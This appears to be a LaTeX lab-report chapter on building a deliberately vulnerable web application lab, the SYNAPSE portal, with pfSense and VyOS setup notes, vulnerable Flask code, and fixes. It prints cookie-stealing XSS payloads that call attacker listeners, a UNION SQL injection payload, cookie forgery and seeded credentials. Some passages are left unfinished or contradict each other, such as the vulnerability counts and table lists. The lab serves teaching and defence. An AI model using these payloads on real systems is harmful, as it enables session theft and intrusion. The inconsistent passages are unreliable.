\section{Lab 2: Web Application Vulnerabilities --- SYNAPSE Intelligence Portal}
\label{lab2:sec-main}

\subsection{Overview and Learning Objectives}
\label{lab2:subsec-overview}

The second laboratory focuses on a class of vulnerabilities that consistently
appears among the most critical in real-world web applications: injection attacks
and client-side scripting abuse. The lab situates these vulnerabilities within a
fictional corporate intelligence portal named \textit{SYNAPSE Intelligence Portal},
operated by a company that handles sensitive analyst data. The scenario is designed
to be plausible: a public-facing web application with an authenticated back-end,
an internal monitoring service, and a multi-tier network architecture.

The attack chain combines four distinct vulnerability classes and requires the
student to chain findings sequentially. A successful run produces three intermediate
artefacts --- a stolen session cookie, a set of database credentials, and remote
command execution --- before reaching the final flag.

The intended learning outcomes are:

\begin{itemize}
    \item Understand how stored Cross-Site Scripting (XSS) differs from reflected
          XSS, and why the stored variant represents a higher-severity threat in
          authenticated applications.
    \item Exploit an unsanitised SQL query endpoint to extract data from a
          back-end database, including credentials stored in plaintext.
    \item Apply extracted credentials to pivot laterally to a second internal
          server.
    \item Identify and exploit a command injection vulnerability in a network
          diagnostic form, achieving remote code execution.
    \item Map the complete attack chain to the OWASP Top~10 framework
          \cite{owasp2021} and identify the corresponding defensive controls.
\end{itemize}

The lab is intentionally more complex than Lab~1. Students are expected to arrive
with a working understanding of HTTP, basic SQL syntax, and familiarity with
browser developer tools. No exploit frameworks are required; all steps can be
completed with standard command-line tools available on the Parrot OS attacker
node.

\subsection{Infrastructure Design Decisions}
\label{lab2:subsec-design}

\subsubsection{Segmented DMZ Architecture}

Unlike Lab~1, where the attack target is reachable via NAT port forwarding from
the external network, Lab~2 places both servers inside a DMZ segment that is
not directly exposed to the student. The attacker must enter through the
Net-Attackers segment and route through VyOS to reach the DMZ. This design
choice has two pedagogical consequences: it requires the student to understand
routing at the network layer before attempting any application-layer attack, and
it makes lateral movement between the two servers a meaningful exercise rather
than a trivial IP change.

\subsubsection{Two-Server Chain}

Splitting the attack chain across two servers adds realism. A web application
running on one host exposes credentials that grant access to a second, otherwise
unreachable service. This models a common pattern in enterprise penetration tests
where a compromised web application is a stepping stone rather than the final
objective.

\subsubsection{Internal DNS Resolution}

VyOS provides DNS forwarding on both the DMZ interface (\texttt{192.168.30.1})
and the attacker interface (\texttt{10.0.40.1}), with static host mappings for
all nodes:

\begin{lstlisting}[language=bash, caption={VyOS static DNS host mappings for Lab 2}]
set system static-host-mapping host-name server-a.lab2.internal inet 192.168.30.10
set system static-host-mapping host-name server-b.lab2.internal inet 192.168.30.20
set system static-host-mapping host-name attacker.lab2.internal inet 10.0.40.10
\end{lstlisting}

This allows the lab instructions to reference servers by name rather than by raw
IP address, which is more consistent with real-world scenarios and introduces
students to the DNS component of an internal environment.

\subsubsection{OWASP-Aligned Vulnerability Chain}

The vulnerability chain is designed to cover four distinct OWASP Top~10 (2021)
categories in a single exercise~\cite{owasp2021}:

\begin{itemize}
    \item \textbf{A07:2021 Cross-Site Scripting (XSS)}: Stored variant in the
          comments section of the web application.
    \item \textbf{A03:2021 Injection}: SQL injection in the search endpoint, and
          OS command injection in the monitoring form.
    \item \textbf{A02:2021 Cryptographic Failures}: Session cookies issued without
          the \texttt{HttpOnly} flag, enabling JavaScript-based theft.
    \item \textbf{A01:2021 Broken Access Control}: Lateral access to an internal
          service using credentials extracted from the database.
\end{itemize}

Covering multiple categories within a single, coherent narrative reinforces the
concept of attack chaining and demonstrates that real compromises rarely exploit
a single vulnerability in isolation.

\subsubsection{pfSense-LAB2}
\label{lab2:subsubsec-pfsense}

The pfSense firewall requires specific corrections to its default behaviour
before it can function correctly in the lab environment. Two default settings
interact badly with an RFC 1918 homelab network: the \textit{Block private
networks} rule on the WAN interface, and the \textit{reply-to} directive
that pfSense adds automatically to WAN firewall rules.

\paragraph{Problem 1: Block private networks.}

By default, pfSense applies a \texttt{quick}-evaluated \texttt{block} rule on
the WAN interface that drops all RFC 1918 source addresses before user-defined
rules are evaluated. Because the lab's management traffic originates from the
homelab subnet (\texttt{192.168.0.0/24}), which is itself RFC 1918 space, all
inbound management connections are silently dropped. The fix is to remove the
\texttt{blockpriv} flag from the WAN interface configuration.

\paragraph{Problem 2: Asymmetric routing from reply-to.}

The \texttt{reply-to} directive causes pfSense to force reply packets back out
through the interface on which the matching state was established. When the
management host and the WAN interface share the same physical subnet
(\texttt{192.168.0.0/24}), this creates asymmetric routing: reply packets are
sent directly to the host rather than through the normal routing path, causing
TCP sessions to reset intermittently. The fix is to set the global
\texttt{disablereplyto} flag.

\paragraph{Solution via PHP API.}

Both corrections were applied by writing directly to the pfSense configuration
array through the PHP management API, avoiding the need for a fully interactive
GUI session:

\begin{lstlisting}[language=php, caption={pfSense PHP API calls to remove blockpriv and reply-to}]
// Remove Block private networks flag on WAN
unset($config['interfaces']['wan']['blockpriv']);

// Disable reply-to globally
$config['system']['disablereplyto'] = true;

// Write configuration back
write_config("Lab2: remove blockpriv and disablereplyto");
\end{lstlisting}

\paragraph{Management access rule.}

After removing the blocking rules, a pass rule was created on the WAN interface
to permit SSH and HTTPS management traffic from the homelab subnet:

\begin{lstlisting}[language=php, caption={pfSense PHP API: WAN management rule for homelab access}]
$rule = [
    'type'        => 'pass',
    'interface'   => 'wan',
    'ipprotocol'  => 'inet',
    'protocol'    => 'tcp',
    'source'      => ['network' => '192.168.0.0/24'],
    'destination' => ['any' => true],
    'dstport'     => '22,443',
    'descr'       => 'Lab2: homelab mgmt access (SSH + HTTPS)',
];
$config['filter']['rule'][] = $rule;
write_config("Lab2: add homelab management rule");
\end{lstlisting}

\paragraph{Static routes.}

Two static routes were added so that pfSense can forward return traffic to both
internal lab segments via VyOS. Table~\ref{lab2:tab-pfsense-routes} lists the
destination networks and the associated gateway.

\begin{table}[h!]
\centering
\caption{Lab 2 --- pfSense static routes}
\label{lab2:tab-pfsense-routes}
\begin{tabular}{@{}lll@{}}
\toprule
\textbf{Destination} & \textbf{Gateway} & \textbf{Purpose} \\
\midrule
192.168.30.0/24 & VyOS\_GW (172.16.1.2) & Route to Net-DMZ via VyOS \\
10.0.40.0/24    & VyOS\_GW (172.16.1.2) & Route to Net-Attackers via VyOS \\
\bottomrule
\end{tabular}
\end{table}

pfSense requires that static routes reference a \textbf{named gateway} entry
rather than a raw IP address in order to persist across reboots. A route that
specifies only a next-hop IP address is recorded in the kernel forwarding table
at runtime but is not applied when the firewall daemon restarts, because the
route manager cannot resolve the destination without a named gateway object.
The gateway entry \texttt{VyOS\_GW} was therefore created first and the two
routes were defined to reference it by name.

The following PHP snippet was executed through the pfSense management API to
create the gateway object and the two persistent routes in \texttt{config.xml}:

\begin{lstlisting}[language=php,
    label=lst:pfsense-gateway,
    caption={pfSense PHP API: create named gateway VyOS\_GW and persistent static routes}]
<?php
require_once('globals.inc'); require_once('config.inc');
require_once('interfaces.inc'); require_once('filter.inc');
require_once('util.inc');

// 1. Define named gateway toward VyOS LAN interface
if (!is_array($config['gateways']['gateway_item'])) {
    $config['gateways']['gateway_item'] = array();
}
$config['gateways']['gateway_item'][] = array(
    'interface'       => 'lan',
    'gateway'         => '172.16.1.2',
    'name'            => 'VyOS_GW',
    'ipprotocol'      => 'inet',
    'descr'           => 'VyOS core router via LAN link',
    'monitor_disable' => true,
);

// 2. Static routes referencing the gateway by name
if (!is_array($config['staticroutes']['route'])) {
    $config['staticroutes']['route'] = array();
}
$config['staticroutes']['route'][] = array(
    'network' => '192.168.30.0/24',
    'gateway' => 'VyOS_GW',
    'descr'   => 'DMZ Net via VyOS',
);
$config['staticroutes']['route'][] = array(
    'network' => '10.0.40.0/24',
    'gateway' => 'VyOS_GW',
    'descr'   => 'Attackers Net via VyOS',
);
write_config("Persistent static routes via VyOS_GW");
filter_configure();
?>
\end{lstlisting}

\subsection{Vulnerable Applications}
\label{lab2:subsec-apps}

\subsubsection{SYNAPSE Intelligence Portal (Server-A)}
\label{lab2:subsubsec-synapse-app}

The SYNAPSE Intelligence Portal is a Flask web application served by an nginx
reverse proxy on port 80. It uses an SQLite database and is containerised with
Docker Compose for ease of deployment and reproducibility. The application
presents an analyst intelligence-sharing portal with the following routes:

\begin{itemize}
    \item \texttt{/}: Public landing page with a list of intelligence reports.
    \item \texttt{/report/<id>}: Individual report view with a comment section.
    \item \texttt{/search?q=<term>}: Report search endpoint.
    \item \texttt{/admin}: Administration panel, accessible only with a valid
          session cookie.
\end{itemize}

\paragraph{Vulnerability 1 --- Stored XSS in the comments section.}

The comment submission endpoint stores the raw user input in the database and
renders it back into the page template without sanitisation. The Jinja2 template
uses the \texttt{safe} filter, which instructs the rendering engine to treat the
stored value as trusted HTML:

\begin{lstlisting}[language=html, caption={Vulnerable Jinja2 template rendering unsanitised comment body}]
{% for comment in comments %}
  <div class="comment">
    <strong>{{ comment.author }}</strong>
    <p>{{ comment.body | safe }}</p>
  </div>
{% endfor %}
\end{lstlisting}

Any HTML or JavaScript submitted as a comment body is stored verbatim in the
database and executed in the browser of any subsequent visitor who loads the
page. This constitutes a \textbf{stored (persistent) XSS} vulnerability
(OWASP A07:2021~\cite{owasp2021}).

The severity is elevated by the second vulnerability described below: the
application issues session cookies without the \texttt{HttpOnly} attribute
(OWASP A02:2021~\cite{owasp2021}), which means that JavaScript executing on
the page has full read access to the cookie value. An attacker can therefore
inject a script that exfiltrates the administrator's session cookie the moment
an administrator views the affected report.

\paragraph{Vulnerability 2 --- SQL Injection in the search endpoint.}

The search endpoint constructs its SQL query by directly concatenating the
user-supplied parameter into the query string without using parameterised
statements:

\begin{lstlisting}[language=python, caption={Vulnerable Flask route with unsanitised SQL query construction}]
@app.route('/search')
def search():
    q = request.args.get('q', '')
    # VULNERABLE: direct string concatenation
    query = "SELECT id, title, summary FROM reports " \
            "WHERE title LIKE '%" + q + "%'"
    results = db.execute(query).fetchall()
    return render_template('search.html', results=results)
\end{lstlisting}

A user who controls the value of \texttt{q} can break out of the string literal
and append arbitrary SQL. This constitutes a classic \textbf{SQL Injection}
vulnerability (OWASP A03:2021~\cite{owasp2021}). The database schema includes a
table named \texttt{admin\_users} with a \texttt{flag} column and a
\texttt{server\_b\_password} column, making this endpoint the pivot point between
the XSS phase and the lateral movement phase.

\subsubsection{SYNAPSE Monitor (Server-B)}
\label{lab2:subsubsec-monitor-app}

The SYNAPSE Monitor is a minimal Flask application that provides a network
diagnostic interface for the internal operations team. It exposes a single
form that accepts a hostname or IP address and runs a ping command against it:

\begin{lstlisting}[language=python, caption={Vulnerable Flask route with unsanitised OS command execution}]
import os
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '')
    # VULNERABLE: user input concatenated directly into shell command
    result = os.popen("ping -c 1 " + host).read()
    return render_template('ping.html', result=result)
\end{lstlisting}

Because the input is concatenated directly into a shell command string without
quoting or escaping, a user who controls the \texttt{host} parameter can inject
additional shell commands using standard separators (\texttt{;}, \texttt{\&\&},
\texttt{|}). This constitutes an \textbf{OS Command Injection} vulnerability
(OWASP A03:2021~\cite{owasp2021}).

\subsubsection{Step 2 --- Stored XSS and Cookie Theft}
\label{lab2:subsubsec-step2}

Having identified the comment section on a report page, the student sets up an
HTTP listener on the attacker machine and submits a crafted XSS payload as a
comment. The payload causes any browser that loads the page to execute JavaScript
that reads the session cookie and sends it to the attacker's listener:

\begin{lstlisting}[language=bash, caption={Setting up an HTTP listener on the attacker node to receive stolen cookies}]
$ nc -lvnp 8080
listening on [any] 8080 ...
\end{lstlisting}

\begin{lstlisting}[language=html, caption={Stored XSS payload submitted as a comment to steal the admin session cookie}]
<script>
  var img = new Image();
  img.src = 'http://10.0.40.10:8080/?c='
            + encodeURIComponent(document.cookie);
</script>
\end{lstlisting}

When an administrator subsequently visits the report page, the injected script
executes in their browser. The attacker's listener receives an HTTP request
containing the cookie value:

\begin{lstlisting}[language=bash, caption={Attacker listener receives the stolen admin session cookie}]
connect to [10.0.40.10] from (UNKNOWN) [192.168.30.10] 54321
GET /?c=session%3DeyJhZG1pbiI6IHRydWV9... HTTP/1.1

\subsubsection{Step 3 --- Administrative Access via Cookie Injection}
\label{lab2:subsubsec-step3}

The stolen cookie is injected into the attacker's browser session using the
browser's developer tools, or equivalently via curl with the \texttt{-b} flag:

\begin{lstlisting}[language=bash, caption={Using the stolen cookie to access the admin panel}]
$ curl -s -b "session=<STOLEN_COOKIE>" http://192.168.30.10/admin

\subsection{Problems Encountered and Solutions}
\label{lab2:subsec-problems}

\subsubsection{pfSense Block Private Networks and Reply-To}

The most significant infrastructure problem encountered during Lab~2 setup was
the interaction between pfSense's default WAN security rules and the homelab
network topology. Two independent default behaviours combined to block all
management traffic.

First, the \textit{Block private networks} option applies a \texttt{quick} rule
at the top of the WAN rule set. The \texttt{quick} keyword in the underlying
\texttt{pf} packet filter causes the rule to match and terminate evaluation
immediately, before any user-defined pass rules are considered. Because the
management subnet \texttt{192.168.0.0/24} is RFC 1918 space, all inbound
connections from the management host were silently dropped regardless of any
pass rules added afterwards.

Second, the \texttt{reply-to} directive, which pfSense adds automatically to
WAN pass rules, forces reply packets to exit through the WAN interface regardless
of the routing table. When the source host and the WAN interface share the same
physical subnet, this causes an asymmetric routing loop: the firewall sends
replies directly to the source via Layer~2 rather than routing them through
the correct path, which breaks TCP state tables and causes sporadic connection
failures even when the blockpriv rule is removed.

Both issues were resolved through the pfSense PHP management API, which allows
direct manipulation of the \texttt{config.xml} configuration array without
requiring a fully interactive GUI session. The \texttt{blockpriv} key was unset
from the WAN interface structure, and the \texttt{disablereplyto} flag was set
globally. These changes were applied before any firewall rules were written,
ensuring a clean baseline for subsequent rule additions.

\subsubsection{VNC Keyboard Input on pfSense}

As documented in Lab~1, automated VNC input via high-level client tools fails
on QEMU-based nodes due to incompatible KeyEvent handling in the QEMU VNC server
implementation. The same raw-socket RFB protocol approach developed for Lab~1
was reused without modification for pfSense-LAB2 configuration. This confirms
that the raw-socket implementation is portable across lab instances and does not
need to be reimplemented per lab.

\subsubsection{Server-A Volume Group Conflict}

During the manual OS installation of Server-A inside EVE-NG, the Ubuntu installer
created an LVM volume group named \texttt{ubuntu-vg} on the virtual disk
\texttt{virtioa.qcow2}. The EVE-NG host operating system also uses a volume
group with the same default name. When the QEMU disk image was mounted on the
host for post-install configuration via \texttt{nbd}, the host LVM subsystem
discovered two volume groups with identical names, causing an activation
conflict.

The resolution was to rename the guest volume group to a descriptive identifier
that includes the lab and node reference:

\begin{lstlisting}[language=bash, caption={Renaming the guest LVM volume group to avoid conflict with the host VG}]
# On the EVE-NG host, after nbd mount:
sudo vgrename --select "uuid=<GUEST_UUID>" ubuntu-vg server-a-vg
\end{lstlisting}

The corresponding \texttt{/etc/fstab} and initramfs references inside the guest
were updated accordingly before the disk was unmounted and the node restarted.
The host volume group was \textbf{not} renamed, as modifying the host VG name
breaks the EVE-NG node storage subsystem. This constraint is now an established
project rule: only guest volume groups are renamed when naming conflicts arise.
%TODO: Confirm Server-B VG rename was also performed correctly once installation completes.

\subsubsection{Server-B Installer Keyboard Layout}

An initial attempt to install Ubuntu Server on Server-B used an autoinstall
preseed with \texttt{keyboard: layout: es} (Spanish layout). When interacting
with the installer over VNC, certain keystrokes sent via the raw-socket RFB
client were interpreted incorrectly because the guest console input layer applied
the Spanish key mapping before the VNC key codes were processed. The \texttt{/}
character arrived as \texttt{-} and \texttt{:} arrived as \texttt{n}, making
command-line interaction during the installation shell session unreliable.

The corrective action was to recreate the autoinstall ISO with
\texttt{keyboard: layout: us}, which aligns the VNC key code interpretation with
the standard USB HID key codes produced by the raw-socket client. The installer
completed successfully with this configuration.

\subsubsection{Static Route Gateway Reference}
\label{lab2:subsubsec-problem-gwref}

During the initial pfSense configuration, the two static routes toward the DMZ
and the attacker segment were entered by specifying the next-hop IP address
\texttt{172.16.1.2} directly in the \texttt{config.xml} route array, without
first creating a named gateway object. The routes were visible in the kernel
forwarding table immediately after the PHP script executed and traffic was
forwarded correctly during that session. However, after the pfSense node was
restarted the routes were absent: the \texttt{staticroutes} daemon could not
re-apply them because the route manager requires a resolvable named gateway
entry to instantiate a persistent route at boot.

The root cause is that pfSense's route manager resolves routes through the
gateway registry, not through raw IP lookups. A route record in
\texttt{config.xml} that contains a bare IP address in the \texttt{gateway}
field is silently skipped at daemon startup if no matching named gateway exists
in the \texttt{gateways.gateway\_item} array.

The solution was to create the named gateway entry \texttt{VyOS\_GW} before
defining any routes, and to reference it by name in each route record. The
corrected PHP script (Listing~\ref{lst:pfsense-gateway}) follows this order:
gateway creation precedes route creation, and the route's \texttt{gateway}
field contains the string \texttt{VyOS\_GW} rather than the IP address. After
applying the corrected script and restarting pfSense, both routes were present
and active on every subsequent boot.

\subsubsection{Output Encoding and Content Security Policy}

The stored XSS vulnerability is entirely preventable by applying
context-aware output encoding: any user-supplied value rendered into an HTML
context must have its special characters converted to their HTML entity
equivalents. In Jinja2 this is the default behaviour when the \texttt{safe}
filter is absent; the fix is therefore to remove the filter rather than add code.

A defence-in-depth measure is to deploy a Content Security Policy (CSP) header
that restricts the origins from which scripts may load. Even if an attacker
manages to inject HTML, a well-configured CSP prevents the injected script from
executing or exfiltrating data to an external origin.

\subsubsection{Parameterised Queries}

SQL Injection is eliminated by using parameterised queries. The database driver
separates the query structure from the data values at the protocol level, making
it impossible for user input to alter the query structure regardless of its
content. The corrected Flask route uses the parameter substitution syntax
provided by the \texttt{sqlite3} driver:

\begin{lstlisting}[language=python, caption={Corrected parameterised SQL query preventing injection}]
@app.route('/search')
def search():
    q = request.args.get('q', '')
    # SAFE: parameterised query
    query = "SELECT id, title, summary FROM reports WHERE title LIKE ?"
    results = db.execute(query, ('%' + q + '%',)).fetchall()
    return render_template('search.html', results=results)
\end{lstlisting}

\subsubsection{Safe Subprocess Execution}

OS Command Injection is prevented by avoiding shell string interpolation
entirely. Python's \texttt{subprocess} module accepts a list of arguments, which
the operating system passes directly to the \texttt{execve} system call without
involving a shell interpreter. No amount of shell metacharacters in the input
can alter the command structure when this pattern is used:

\begin{lstlisting}[language=python, caption={Corrected ping function using subprocess with argument list}]
import subprocess

@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '')
    # SAFE: list-based subprocess, no shell=True
    result = subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True, text=True, timeout=5
    ).stdout
    return render_template('ping.html', result=result)
\end{lstlisting}

Additional input validation --- checking that \texttt{host} matches a valid
hostname or IP address pattern before passing it to the subprocess --- provides
a second layer of defence.

\subsubsection{Secret Management and Principle of Least Privilege}

Storing server credentials in a web application database represents a fundamental
violation of the principle of least privilege and the separation of secrets. In a
production environment, inter-service credentials would be managed by a secret
management system (such as environment variables injected at runtime or a
dedicated vault service) and would never appear in application database tables
accessible to the web tier.

Additionally, the monitoring service on Server-B ran with sufficient privilege
to read \texttt{/root/flag\_final.txt}, implying either root-level execution
or overly broad file permissions. Restricting the service to a dedicated,
unprivileged user account with access only to the resources it requires would
have prevented the final flag from being readable even after command injection
was achieved.

\subsubsection{Vulnerabilities Demonstrated}

The lab demonstrates five vulnerability classes that represent the most
consistently exploited categories in real web application assessments:

\begin{itemize}
    \item \textbf{Stored XSS with session hijacking.} The combination of an
          unescaped template filter and a cookie issued without \texttt{HttpOnly}
          creates a complete session hijacking attack path from a single comment
          submission.
    \item \textbf{UNION-based SQL Injection.} Direct string concatenation in a
          search query allows full exfiltration of the database, including
          credentials that enable lateral movement.
    \item \textbf{Broken access control (admin panel).} The \texttt{/admin}
          route checks role by reading an unsigned cookie, so a broken-auth
          bypass grants immediate access to classified data and Server-B creds.
    \item \textbf{Insecure YAML deserialization (OWASP A08).} Server-B's preview
          endpoint passes attacker-controlled content to \texttt{yaml.UnsafeLoader},
          enabling RCE via a reverse shell payload.
\end{itemize}

\subsubsection{Lessons Learned}

\begin{itemize}
    \item \textbf{Attack chaining amplifies individual vulnerability impact.}
          None of the five vulnerabilities in isolation would yield the final flag.
          Their combination demonstrates how moderate-severity findings combine
          into a critical-severity compromise, which is the standard pattern in
          real penetration test findings.
    \item \textbf{Default firewall behaviours require explicit validation.}
          The pfSense \textit{Block private networks} and \textit{reply-to}
          defaults are rational security measures in a public-facing deployment
          but create unexpected obstacles in a homelab-routed environment. Any
          security appliance must be evaluated against the actual network topology
          rather than assumed to behave correctly based on its default
          configuration.
    \item \textbf{Installer automation reduces manual VNC interaction.}
          The autoinstall preseed approach significantly reduced the number of
          interactive VNC operations required to install Ubuntu Server on each
          node. The keyboard layout issue, once identified, was resolved by a
          single parameter change in the preseed configuration.
    \item \textbf{LVM volume group naming requires proactive planning.}
          The volume group naming conflict between the EVE-NG host and the guest
          disk image is a predictable problem whenever a Linux guest with default
          LVM configuration is provisioned on a Linux host that also uses LVM.
          Pre-planning the guest VG name to include a unique lab and node
          identifier during installation eliminates the need for post-install
          renaming.
\end{itemize}

\subsubsection{Phase F3: SYNAPSE Intelligence Portal (Server-A)}
\label{subsubsec:lab2-f3-server-a}

The SYNAPSE Intelligence Portal was deployed on Server-A
(\texttt{192.168.30.10}) using Docker Compose. The application stack

\begin{itemize}

    \item \textbf{synapse\_victim} --- Playwright headless browser bot.

The Docker Compose file is located at \texttt{/opt/synapse/docker-compose.yml}

\paragraph{Database schema.}
The SQLite database is initialised by \texttt{init\_db.py} at container
start. It creates four tables:

\begin{itemize}
    \item \textbf{users} --- application login credentials (id, username,
          password MD5, role). Pre-seeded with \texttt{admin} /
          \texttt{Admin@Synapse2024} and \texttt{guest} / \texttt{guest123}.
    \item \textbf{reports} --- intelligence reports displayed in the portal
          (five dummy rows).
    \item \textbf{comments} --- user-submitted comments, rendered without
          sanitisation (XSS sink).
    \item \textbf{admin\_users} --- credential and flag store. Contains
          \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}} (FLAG~\#1).
    \item \textbf{classified\_intel} --- classified intelligence table.
          Contains \texttt{FLAG\{synapse\_admin\_classified\_accessed\}} (FLAG~\#2)
          and Server-B credentials (\texttt{operator / D4t4V4ult\#2024}).
          Contains \texttt{monitor} / \texttt{M0nit0r2024} and
          \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}}.
\end{itemize}

\paragraph{Vulnerability 1 --- Stored XSS (\texttt{/comments}).}
The \texttt{comments.html} template renders the comment body with
Jinja2's \texttt{|\,safe} filter, bypassing HTML escaping:

\begin{lstlisting}[language=HTML, caption={XSS sink in comments.html}]
<div class="body">{{ c.body | safe }}</div>
\end{lstlisting}

Any HTML or JavaScript submitted as a comment is stored in the database
and executed verbatim in the browser of every subsequent visitor,
including the victim bot. Because the session cookie is issued without
the \texttt{HttpOnly} flag, it is accessible from JavaScript:

\begin{lstlisting}[language=Python, caption={Cookie issued without HttpOnly (app.py)}]
resp.set_cookie('session',
    f"{user['id']}:{user['role']}:{user['username']}",
    httponly=False)
\end{lstlisting}

A typical XSS payload to exfiltrate the victim cookie to an attacker-controlled
listener on Parrot (\texttt{python3 -m http.server 8000}) is:

\begin{lstlisting}[language=HTML, caption={XSS payload for cookie exfiltration}]
<script>
fetch('http://10.0.40.5:8000/?c='
      + encodeURIComponent(document.cookie)
      + '&t=' + Date.now());
</script>
\end{lstlisting}

The victim bot visits \texttt{/comments} every 20 seconds, so the cookie
arrives in the listener log within approximately one polling cycle.

\paragraph{Broken authentication (\texttt{/portal}, \texttt{/search}).}
The session cookie uses the format \texttt{ID:ROLE:USERNAME} and is not
cryptographically signed. The server extracts role and username directly
from the cookie string without any integrity check:

\begin{lstlisting}[language=Python, caption={Unsigned cookie parsing (app.py)}]
parts = session.split(':')
role  = parts[1] if len(parts) > 1 else 'guest'
\end{lstlisting}

Setting \texttt{document.cookie = "session=1:admin:admin; path=/"} in
the browser console immediately grants admin-level access to all
restricted routes without knowing the admin password.

\paragraph{Vulnerability 2 --- UNION-based SQL Injection (\texttt{/search}).}
The search route constructs a SQL query by direct string concatenation:

\begin{lstlisting}[language=Python, caption={SQLi sink in app.py}]
query = "SELECT * FROM reports WHERE title LIKE '%" + q + "%'"
results = db.execute(query).fetchall()
\end{lstlisting}

SQL errors are returned to the browser, confirming the injection point.
The \texttt{reports} table has five columns. A UNION payload to extract
credentials from the \texttt{admin\_users} table is:

\begin{lstlisting}[caption={UNION SQLi payload to dump admin\_users}]
' UNION SELECT 1,username,flag,password,5 FROM admin_users--
\end{lstlisting}

This returns \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}} (FLAG~\#1).
The student then navigates to \texttt{/admin} with the forged admin cookie
to obtain FLAG~\#2 and Server-B DataVault credentials.
